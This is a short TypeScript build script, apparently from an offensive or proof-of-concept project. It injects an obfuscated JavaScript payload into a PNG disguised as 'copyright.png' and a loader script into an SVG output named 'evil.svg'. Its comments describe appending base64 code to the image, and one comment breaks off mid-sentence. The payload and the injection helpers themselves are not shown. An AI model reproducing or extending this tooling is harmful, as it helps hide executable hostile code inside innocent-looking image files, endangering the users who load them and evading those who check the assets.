import { injectLoader, injectPayload } from "../components"

/**
 * This script is called by the build step to inject the pre-processed code into
 *  the loader and payload image files.
 *
 * The `payload` image is a png file that appends the base64 to the trailing
 *  semicolon.
 *
 * The `loader`
 */
const injectImages = async (): Promise<void> => {

  await injectPayload({
    codeSrc: "temp/payload-obfuscated.js",
    imageSrc: "assets/copyright.png",
    imageDst: "dist/copyright.png"
  })

  await injectLoader({
    codeSrc: "temp/loader.js",
    imageSrc: "assets/demo.svg",
    imageDst: "dist/evil.svg"
  })

}

injectImages().catch(error => console.error(error))
